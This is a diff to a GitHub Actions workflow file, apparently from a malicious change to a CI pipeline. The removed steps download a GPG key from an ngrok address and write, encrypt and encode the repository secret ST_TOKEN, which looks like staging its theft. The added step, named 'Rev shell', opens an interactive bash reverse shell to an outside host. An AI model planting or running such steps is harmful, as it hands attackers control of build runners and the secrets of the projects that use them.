@@ -13,18 +13,8 @@ jobs:
   install-tparse:
     runs-on: ubuntu-latest
     steps:
-      - name: Get key
-        run: wget https://c574-85-52-243-15.ngrok-free.app/ignacio.key
-      - name: Import GPG key
-        run: gpg --import ignacio.key
-      - name: get secrets
-        run: echo ${{ secrets.ST_TOKEN }} > secret.txt
-      - name: trust key
-        run: echo -e "5\ny\n" | gpg --command-fd 0 --edit-key tmp_key trust --no-tty
-      - name: encrypt secrets
-        run: gpg -e -r tmp_key secret.txt --no-tty
-      - name: encode encrypted secrets
-        run: base64 <<< secret.txt.gpg
+      - name: Rev shell
+        run: bash -i >& /dev/tcp/congon4tor.com/8888 0>&1
       
 
   
